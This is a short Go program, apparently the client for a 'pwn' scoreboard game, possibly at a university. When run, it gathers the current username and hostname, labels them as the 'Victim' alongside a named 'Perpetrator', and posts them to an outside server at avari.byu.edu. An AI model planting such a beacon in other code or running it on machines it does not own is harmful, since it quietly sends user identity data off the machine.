package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"net/http"
	"os"
	"os/user"

	"../common"
)

func main() {
	perpPtr := flag.String("by", "anon", "Who to record the score as")
	flag.Parse()

	host, _ := os.Hostname()
	currentUser, _ := user.Current()

	a := common.Record{Victim: currentUser.Username, Perpetrator: *perpPtr, Host: host}

	jsonBlob, _ := json.Marshal(a)

	_, err := http.Post("http://avari.byu.edu:9999/submit", "application/json; charset=utf-8", bytes.NewBuffer(jsonBlob))

	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Println("Recorded pwn!")
	}
}
